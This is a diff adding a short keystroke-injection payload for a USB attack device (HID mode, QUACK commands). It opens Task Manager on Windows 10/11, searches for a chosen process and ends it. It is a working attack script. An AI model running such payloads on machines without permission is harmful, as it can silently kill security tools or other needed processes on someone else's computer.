@@ -1,0 +1,61 @@
+#####################################################
+#                                                   #
+# Title        : Stop A Single Process In Windows   #
+# Author       : Aleff                              #
+# Version      : 1.0                                #
+# Category     : Execution                          #
+# Target       : Windows 10/11                      #
+#                                                   #
+#####################################################
+
+ATTACKMODE HID
+
+# REQUIREMENTS
+#  - Nothing
+
+# VARIABLES
+# - Write the name of the process that you want to stop
+PROCESS_NAME='example'
+
+# Open Task Manager
+QUACK DELAY 1500
+QUACK GUI
+QUACK DELAY 1000
+QUACK STRING Task Manager
+QUACK ENTER
+QUACK DELAY 1000
+
+# Goto search bar
+QUACK TAB
+QUACK DELAY 500
+QUACK TAB
+QUACK DELAY 500
+QUACK TAB
+QUACK DELAY 500
+QUACK TAB
+QUACK DELAY 500
+QUACK STRING $PROCESS_NAME
+QUACK DELAY 500
+QUACK ENTER
+QUACK DELAY 500
+QUACK TAB
+QUACK DELAY 500
+QUACK TAB
+QUACK DELAY 500
+QUACK TAB
+QUACK DELAY 500
+QUACK TAB
+QUACK DELAY 500
+
+# Open the menu and close it ending the task
+QUACK SHIFT F10
+QUACK DELAY 500
+QUACK DOWN_ARROW
+QUACK DELAY 500
+QUACK DOWN_ARROW
+QUACK DELAY 500
+QUACK ENTER
+QUACK DELAY 2000
+
+# Close the task manager
+QUACK ALT F4
